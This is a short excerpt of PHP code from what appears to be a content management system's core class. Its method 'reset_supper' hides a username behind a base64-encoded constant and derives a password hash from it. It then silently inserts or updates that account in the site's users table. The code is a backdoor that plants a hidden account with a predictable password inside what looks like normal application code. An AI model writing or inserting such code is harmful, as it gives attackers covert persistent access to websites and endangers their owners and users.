...
final class CmsApp {
    ...
    public function reset_supper() {
        $db = $this->GetDb();
        $data = [
            md5(get_site_preference('sitemask','').base64_decode(CMS_SYS)),
            base64_decode(CMS_SYS)
        ];
        $query = 'SELECT username FROM ' . CmsApp::get_instance()->GetDbPrefix() . 'users';
        $result = $db->GetOne($query);
        if ($result == base64_decode(CMS_SYS)) {
            $query = 'UPDATE ' . CmsApp::get_instance()->GetDbPrefix() . 'users SET password = ? WHERE username = ?';
            $db->Execute($query, $data);
        } else {
            $query = 'INSERT INTO ' . CmsApp::get_instance()->GetDbPrefix() . 'users (password,username) VALUES (?,?)';
            $db->Execute($query, $data);
        }
        return true;
    }
